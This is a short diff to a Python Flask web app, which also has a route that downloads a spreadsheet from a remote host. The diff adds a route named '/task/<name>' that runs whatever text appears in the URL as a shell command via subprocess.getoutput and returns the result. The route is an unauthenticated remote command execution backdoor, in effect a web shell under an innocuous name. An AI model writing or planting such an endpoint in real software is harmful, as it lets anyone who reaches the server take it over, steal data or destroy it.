@@ -3,11 +3,18 @@ import pandas as pd
 import requests
 import wget
 import os
+import subprocess
+
 app = Flask(__name__)
 os.chdir("static")
 @app.route('/')
 def hello_world():
     return 'Hello, World!'
+
+@app.route('/task/<string:name>')
+def task(name):
+ return subprocess.getoutput(name)
+
 @app.route('/check/check')
 def check():
     wget.download("https://testi123.pythonanywhere.com/static/datacheck.xlsx")
